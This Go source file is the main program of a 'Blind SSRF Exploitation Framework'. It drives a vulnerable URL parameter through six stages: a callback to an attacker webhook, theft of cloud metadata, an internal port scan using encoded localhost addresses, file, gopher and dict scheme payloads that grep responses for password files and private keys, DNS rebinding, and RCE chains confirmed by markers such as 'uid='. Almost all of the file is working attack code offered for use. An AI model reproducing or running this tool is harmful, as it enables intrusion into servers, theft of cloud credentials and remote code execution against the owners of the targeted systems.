package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"ssrf-framework/dnsrebind"
	"ssrf-framework/exploit"
	"ssrf-framework/report"
)

const version = "3.0"

type Config struct {
	Target     string
	Param      string
	Method     string
	Headers    string
	Webhook    string
	OutputFile string
	HTMLOutput string
	DNSServer  string
	Threads    int
	Timeout    int
	Mode       string
	ChainMode  bool
	DNSPort    int
}

type Finding = report.Finding

var findings []Finding
var mu sync.Mutex
var dnsServer *dnsrebind.Server

func banner() {
	fmt.Printf(`███████╗███████╗██████╗ ███████╗ ███████╗██╗ ██╗██████╗ ██╗
██╔════╝██╔════╝██╔══██╗██╔════╝ ██╔════╝╚██╗██╔╝██╔═══██╗██║
███████╗█████╗ ██████╔╝█████╗ █████╗ ╚███╔╝ ██║ ██║██║
╚════██║██╔══╝ ██╔══██╗██╔══╝ ██╔══╝ ██╔██╗ ██║▄▄ ██║██║
███████║███████╗██║ ██║██║ ██╗██║ ██╔╝ ██╗╚██████╔╝███████╗
╚══════╝╚══════╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚══▀▀═╝ ╚══════╝
Blind SSRF Exploitation Framework v%s
[+] DNS Rebinding [+] HTML Report [+] RCE Chains [+] IPv6
`, version)
}

func addFinding(f Finding) {
	mu.Lock()
	defer mu.Unlock()
	if f.Timestamp.IsZero() {
		f.Timestamp = time.Now()
	}
	findings = append(findings, f)
}

func sendRequest(target, param, payload, method, customHeaders string, timeout int) (int, string, int) {
	u, err := url.Parse(target)
	if err != nil {
		return 0, "", 0
	}

	q := u.Query()
	q.Set(param, payload)
	u.RawQuery = q.Encode()

	req, err := http.NewRequest(method, u.String(), nil)
	if err != nil {
		return 0, "", 0
	}

	req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Connection", "close")

	if customHeaders != "" {
		for _, h := range strings.Split(customHeaders, ";") {
			parts := strings.SplitN(h, ":", 2)
			if len(parts) == 2 {
				req.Header.Set(strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1]))
			}
		}
	}

	tr := &http.Transport{
		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
		DisableKeepAlives: true,
		MaxIdleConns:      10,
		IdleConnTimeout:   5 * time.Second,
	}

	client := &http.Client{
		Timeout:   time.Duration(timeout) * time.Second,
		Transport: tr,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	resp, err := client.Do(req)
	if err != nil {
		return 0, "", 0
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	return resp.StatusCode, string(body), len(body)
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// ============ STEP 1: CALLBACK DETECT ============
func step1_CallbackDetect(cfg Config) {
	fmt.Println("\n\033[36m[STEP 1]\033[0m Callback Detection (Confirm Blind SSRF)")
	fmt.Println(strings.Repeat("─", 60))

	if cfg.Webhook == "" {
		fmt.Println(" [!] No webhook. Use -w https://webhook.site/xxx")
		return
	}

	tests := []string{
		cfg.Webhook,
		cfg.Webhook + "?test=ssrf",
		cfg.Webhook + "/rebinding-test",
	}

	for _, payload := range tests {
		status, _, size := sendRequest(cfg.Target, cfg.Param, payload, cfg.Method, cfg.Headers, cfg.Timeout)
		addFinding(Finding{
			Type:        "Callback",
			Category:    "recon",
			Payload:     payload,
			StatusCode:  status,
			ResponseLen: size,
			Note:        "Check your callback server",
		})
		fmt.Printf(" [→] Sent: %s\n", payload)
		time.Sleep(500 * time.Millisecond)
	}
	fmt.Println(" [\033[32m✓\033[0m] Check your webhook now! Waiting 5s for callbacks...")
	time.Sleep(5 * time.Second)
}

// ============ STEP 2: CLOUD METADATA ============
func step2_CloudMetadata(cfg Config) {
	fmt.Println("\n\033[36m[STEP 2]\033[0m Cloud Metadata Exfiltration")
	fmt.Println(strings.Repeat("─", 60))

	for _, m := range exploit.CloudMetadataPayloads() {
		status, body, size := sendRequest(cfg.Target, cfg.Param, m.URL, cfg.Method, cfg.Headers, cfg.Timeout)

		severity := "info"
		note := "Tested"
		if status == 200 && size > 0 {
			severity = "critical"
			note = "🎯 CLOUD METADATA LEAKED!"
		}

		addFinding(Finding{
			Type:        "CloudMetadata",
			Category:    m.Provider,
			Payload:     m.URL,
			StatusCode:  status,
			ResponseLen: size,
			Note:        note,
			Severity:    severity,
			Evidence:    truncate(body, 500),
		})

		icon := "·"
		if severity == "critical" {
			icon = "\033[31m✓✓✓\033[0m"
		} else if status == 200 {
			icon = "\033[33m✓\033[0m"
		}
		fmt.Printf(" [%s] %s (%d) %dB\n", icon, m.URL, status, size)
		if severity == "critical" && size < 500 {
			fmt.Printf(" \033[33mBody: %s\033[0m\n", body)
		}
		time.Sleep(300 * time.Millisecond)
	}
}

func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "..."
}

// ============ STEP 3: INTERNAL PORT SCAN ============
func step3_InternalPortScan(cfg Config) {
	fmt.Println("\n\033[36m[STEP 3]\033[0m Internal Port Scan")
	fmt.Println(strings.Repeat("─", 60))

	// شامل IPv6 و IPv4 encoded
	hosts := []string{
		"127.0.0.1", "127.0.0.2", "127.1", "127.0.1",
		"0.0.0.0", "0",
		"localhost", "localtest.me",
		"0177.0.0.1", "0x7f000001", "2130706433",
		"169.254.169.254", // AWS/GCP/Azure
		"::1", "[::1]", "[0:0:0:0:0:0:0:1]",
		"fc00::1", "fd00::1", // IPv6 internal
		"10.0.0.1", "10.0.0.2", "192.168.1.1",
	}

	// پورت‌های کامل
	ports := []int{
		21, 22, 23, 25, 53, 80, 81, 88, 110, 111, 135, 139, 143, 161, 389, 443,
		445, 465, 514, 587, 636, 873, 902, 989, 993, 995, 1080, 1099, 1158,
		1234, 1433, 1521, 1723, 1883, 2049, 2181, 2375, 2376, 3000, 3001,
		3128, 3306, 3389, 3690, 4000, 4040, 4443, 4567, 4848, 5000, 5001,
		5060, 5222, 5432, 5601, 5672, 5900, 5984, 5985, 5986, 6082, 6379,
		6443, 6660, 6666, 7001, 7077, 7474, 8000, 8001, 8008, 8009, 8080,
		8081, 8082, 8083, 8086, 8088, 8089, 8090, 8091, 8200, 8443, 8500,
		8880, 8883, 8888, 9000, 9001, 9042, 9090, 9091, 9092, 9100, 9200,
		9300, 9418, 9443, 9999, 10000, 10250, 11211, 15672, 26379, 27017,
		27018, 27019, 28017, 50000, 50070, 61613,
	}

	fmt.Printf(" Scanning %d hosts × %d ports = %d combos (workers: %d)\n",
		len(hosts), len(ports), len(hosts)*len(ports), cfg.Threads)
	fmt.Println(" Press Ctrl+C to stop")

	jobs := make(chan string, 200)
	var wg sync.WaitGroup

	openCount := 0
	var openMu sync.Mutex

	for w := 0; w < cfg.Threads; w++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for job := range jobs {
				status, body, size := sendRequest(cfg.Target, cfg.Param, job, cfg.Method, cfg.Headers, cfg.Timeout)

				if status == 0 || status == 502 || status == 504 {
					continue
				}

				host, portStr, _ := net.SplitHostPort(strings.TrimPrefix(strings.TrimPrefix(job, "http://"), "https://"))
				port, _ := strconv.Atoi(portStr)

				severity := "info"
				note := "Filtered"
				icon := "·"

				switch status {
				case 200:
					severity = "high"
					note = "Open & accessible"
					icon = "\033[31m✓✓✓\033[0m"
				case 301, 302, 307, 308:
					severity = "high"
					note = "Redirect (probably open)"
					icon = "\033[33m✓\033[0m"
				case 401, 403:
					severity = "medium"
					note = "Open but auth required"
					icon = "\033[33m✓\033[0m"
				case 400, 404:
					severity = "info"
					note = "Probably closed"
				case 500:
					severity = "low"
					note = "App error (might be open)"
				}

				if severity == "high" || severity == "medium" {
					addFinding(Finding{
						Type:        "OpenPort",
						Category:    "portscan",
						Payload:     job,
						StatusCode:  status,
						ResponseLen: size,
						Host:        host,
						Port:        port,
						Note:        note,
						Severity:    severity,
						Evidence:    truncate(body, 300),
					})

					openMu.Lock()
					openCount++
					openMu.Unlock()

					fmt.Printf(" [%s] %s (HTTP %d, %dB) - %s\n", icon, job, status, size, note)
					if size > 0 && size < 250 {
						fmt.Printf(" %s\n", truncate(body, 200))
					}
				}
			}
		}()
	}

	for _, host := range hosts {
		for _, port := range ports {
			payload := fmt.Sprintf("http://%s:%d/", host, port)
			jobs <- payload
		}
	}
	close(jobs)
	wg.Wait()

	fmt.Printf("\n [\033[32m✓\033[0m] Found \033[33m%d\033[0m open/internal ports\n", openCount)
}

// ============ STEP 4: SCHEME EXPLOITATION ============
func step4_SchemeExploit(cfg Config) {
	fmt.Println("\n\033[36m[STEP 4]\033[0m Scheme Exploitation (file://, gopher://, dict://)")
	fmt.Println(strings.Repeat("─", 60))

	payloads := exploit.SchemePayloads()
	interesting := []string{"root:x:", "AWS_ACCESS_KEY", "BEGIN PRIVATE", "password", "api_key", "localhost", "127.0.0.1"}

	for _, p := range payloads {
		status, body, size := sendRequest(cfg.Target, cfg.Param, p, cfg.Method, cfg.Headers, cfg.Timeout)

		severity := "info"
		note := "Tested"
		for _, kw := range interesting {
			if strings.Contains(body, kw) {
				severity = "critical"
				note = "🎯 SENSITIVE DATA LEAKED: " + kw
				break
			}
		}
		if status == 200 && size > 0 && severity == "info" {
			severity = "medium"
			note = "Response received"
		}

		addFinding(Finding{
			Type:        "SchemeExploit",
			Category:    "scheme",
			Payload:     p,
			StatusCode:  status,
			ResponseLen: size,
			Scheme:      extractScheme(p),
			Note:        note,
			Severity:    severity,
			Evidence:    truncate(body, 500),
		})

		icon := "·"
		if severity == "critical" {
			icon = "\033[31m✓✓✓\033[0m"
		} else if severity == "medium" {
			icon = "\033[33m✓\033[0m"
		}
		fmt.Printf(" [%s] %s (HTTP %d, %dB)\n", icon, p, status, size)
		if severity == "critical" {
			fmt.Printf(" \033[31m%s\033[0m\n", truncate(body, 400))
		}
		time.Sleep(200 * time.Millisecond)
	}
}

func extractScheme(s string) string {
	if i := strings.Index(s, "://"); i > 0 {
		return s[:i]
	}
	return ""
}

// ============ STEP 5: DNS REBINDING ============
func step5_DNSRebinding(cfg Config) {
	fmt.Println("\n\033[36m[STEP 5]\033[0m DNS Rebinding Attack")
	fmt.Println(strings.Repeat("─", 60))

	if cfg.DNSServer == "" {
		cfg.DNSServer = "127.0.0.1"
	}
	cfg.DNSPort = 5353

	// استارت DNS server
	var err error
	dnsServer, err = dnsrebind.NewServer(cfg.DNSPort, []string{
		"169.254.169.254",
		"127.0.0.1",
		"localhost",
		"[::1]",
		"10.0.0.1",
	})
	if err != nil {
		fmt.Printf(" [!] DNS server error: %v\n", err)
		return
	}

	go dnsServer.Start()
	defer dnsServer.Stop()

	domains := []string{
		"rebind.test",
		"make-127.0.0.1-rebind-169.254.169.rr.nip.io",
		"make-127.0.0.1-rebind-169.254.169.254-rr.1u.ms",
		"1.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.ip6.arpa",
	}

	fmt.Println(" Testing DNS rebinding domains (might take time)...")

	for _, domain := range domains {
		// چند بار تست کن
		for i := 0; i < 3; i++ {
			payload := fmt.Sprintf("http://%s/", domain)
			status, body, size := sendRequest(cfg.Target, cfg.Param, payload, cfg.Method, cfg.Headers, cfg.Timeout)

			severity := "info"
			note := "DNS Rebind attempt"
			if status == 200 && size > 0 && i > 0 {
				// اگه بعد از چند تلاش جواب داد، یعنی rebind موفق بوده
				severity = "critical"
				note = "🎯 DNS REBIND SUCCESSFUL"
			}

			addFinding(Finding{
				Type:        "DNSRebind",
				Category:    "rebinding",
				Payload:     payload,
				StatusCode:  status,
				ResponseLen: size,
				Note:        note,
				Severity:    severity,
				Evidence:    truncate(body, 300),
			})

			icon := "·"
			if severity == "critical" {
				icon = "\033[31m✓✓✓\033[0m"
				fmt.Printf(" [%s] %s attempt %d (HTTP %d, %dB) - REBIND SUCCESS!\n",
					icon, domain, i+1, status, size)
			} else {
				fmt.Printf(" [%s] %s attempt %d (HTTP %d)\n", icon, domain, i+1, status)
			}
			time.Sleep(1 * time.Second)
		}
	}
}

// ============ STEP 6: RCE CHAINS ============
func step6_RCEChains(cfg Config) {
	fmt.Println("\n\033[36m[STEP 6]\033[0m RCE Chain Exploitation")
	fmt.Println(strings.Repeat("─", 60))

	chains := exploit.RCEChains()
	for _, chain := range chains {
		fmt.Printf("\n → Chain: \033[33m%s\033[0m\n", chain.Name)

		for _, p := range chain.Payloads {
			status, body, size := sendRequest(cfg.Target, cfg.Param, p, cfg.Method, cfg.Headers, cfg.Timeout)

			severity := "info"
			note := "Chain payload"
			if status == 200 && size > 0 {
				// بررسی نشانه‌های موفقیت
				successMarkers := []string{
					"uid=", "root", "www-data", "command executed",
					"OS:", "Hostname:", "Microsoft Windows",
				}
				for _, marker := range successMarkers {
					if strings.Contains(body, marker) {
						severity = "critical"
						note = "🎯 RCE CONFIRMED: " + marker
						break
					}
				}
			}

			addFinding(Finding{
				Type:        "RCE-Chain",
				Category:    chain.Name,
				Payload:     p,
				StatusCode:  status,
				ResponseLen: size,
				Note:        note,
				Severity:    severity,
				Evidence:    truncate(body, 500),
			})

			icon := "·"
			if severity == "critical" {
				icon = "\033[31m✓✓✓\033[0m"
			}
			fmt.Printf(" [%s] %s (HTTP %d, %dB)\n", icon, truncate(p, 80), status, size)
			if severity == "critical" {
				fmt.Printf(" \033[31m%s\033[0m\n", truncate(body, 400))
			}
			time.Sleep(300 * time.Millisecond)
		}
	}
}

// ============ MAIN ============
func main() {
	target := flag.String("u", "", "Target URL")
	param := flag.String("p", "url", "Vulnerable parameter")
	method := flag.String("X", "GET", "HTTP method")
	headers := flag.String("H", "", "Custom headers")
	webhook := flag.String("w", "", "Callback webhook URL")
	output := flag.String("o", "report.json", "JSON output file")
	htmlOutput := flag.String("html", "report.html", "HTML output file")
	dnsServer := flag.String("dns", "127.0.0.1", "DNS server IP")
	threads := flag.Int("t", 30, "Number of threads")
	timeout := flag.Int("timeout", 10, "Request timeout (s)")
	mode := flag.String("mode", "all", "Mode: detect|metadata|scan|schemes|rebinding|rce|all")
	flag.Parse()

	banner()

	if *target == "" {
		fmt.Println("\nUsage:")
		fmt.Println(" ./ssrf-exploit -u 'http://target.com/page?id=1' -p url -w 'https://webhook.site/xxx' -mode all")
		fmt.Println("\nModes:")
		fmt.Println(" detect - Callback test")
		fmt.Println(" metadata - Cloud metadata (AWS/GCP/Azure)")
		fmt.Println(" scan - Internal port scan (IPv4+IPv6)")
		fmt.Println(" schemes - file://, gopher://, dict://")
		fmt.Println(" rebinding - DNS rebinding attack")
		fmt.Println(" rce - RCE chain exploitation")
		fmt.Println(" all - Run everything")
		os.Exit(1)
	}

	cfg := Config{
		Target:     *target,
		Param:      *param,
		Method:     *method,
		Headers:    *headers,
		Webhook:    *webhook,
		OutputFile: *output,
		HTMLOutput: *htmlOutput,
		DNSServer:  *dnsServer,
		Threads:    *threads,
		Timeout:    *timeout,
		Mode:       *mode,
	}

	fmt.Printf("\n\033[36m[Config]\033[0m")
	fmt.Printf("\n Target: %s", cfg.Target)
	fmt.Printf("\n Param: %s", cfg.Param)
	fmt.Printf("\n Webhook: %s", cfg.Webhook)
	fmt.Printf("\n Mode: %s", cfg.Mode)
	fmt.Printf("\n Threads: %d", cfg.Threads)

	switch cfg.Mode {
	case "detect":
		step1_CallbackDetect(cfg)
	case "metadata":
		step2_CloudMetadata(cfg)
	case "scan":
		step3_InternalPortScan(cfg)
	case "schemes":
		step4_SchemeExploit(cfg)
	case "rebinding":
		step5_DNSRebinding(cfg)
	case "rce":
		step6_RCEChains(cfg)
	case "all":
		step1_CallbackDetect(cfg)
		step2_CloudMetadata(cfg)
		step3_InternalPortScan(cfg)
		step4_SchemeExploit(cfg)
		step5_DNSRebinding(cfg)
		step6_RCEChains(cfg)
	default:
		fmt.Printf("[!] Unknown mode: %s\n", cfg.Mode)
		os.Exit(1)
	}

	// Generate reports
	report.GenerateJSON(findings, cfg.Target, cfg.OutputFile)
	report.GenerateHTML(findings, cfg.Target, cfg.HTMLOutput)

	fmt.Printf("\n\033[32m[✓] Reports generated:\033[0m\n")
	fmt.Printf(" - JSON: %s\n", cfg.OutputFile)
	fmt.Printf(" - HTML: %s\n", cfg.HTMLOutput)
	fmt.Printf(" - Total findings: %d\n", len(findings))

	critical := 0
	for _, f := range findings {
		if f.Severity == "critical" {
			critical++
		}
	}
	if critical > 0 {
		fmt.Printf(" - \033[31m%d CRITICAL findings\033[0m\n", critical)
	}
}
